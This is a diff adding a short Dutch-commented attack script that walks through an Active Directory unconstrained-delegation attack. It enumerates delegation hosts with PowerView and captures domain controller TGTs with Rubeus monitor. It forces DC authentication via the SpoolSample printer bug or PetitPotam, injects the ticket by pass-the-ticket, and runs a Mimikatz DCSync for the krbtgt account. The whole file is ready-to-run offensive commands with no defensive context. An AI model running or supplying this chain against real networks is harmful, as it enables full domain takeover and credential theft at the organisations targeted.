@@ -1,0 +1,13 @@
+# Unconstrained Delegation aanval - TGT capture via printer bug
+# Stap 1: Vind servers met unconstrained delegation
+powershell -c "Import-Module .\PowerView.ps1; Get-DomainComputer -Unconstrained | select dnshostname"
+# Stap 2: Monitor op binnenkomende TGTs (op unconstrained server)
+.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
+# Stap 3: Trigger printer bug vanuit andere sessie (forceer DC auth)
+.\SpoolSample.exe DC01.domain.local WEB01.domain.local
+# Of met PetitPotam:
+python3 PetitPotam.py WEB01@80/test DC01 -d domain.local -u user -p pass
+# Stap 4: TGT verschijnt in Rubeus monitor - inject met PTT
+.\Rubeus.exe ptt /ticket:BASE64_DC_TGT
+# Stap 5: DCSync met het DC machine account
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
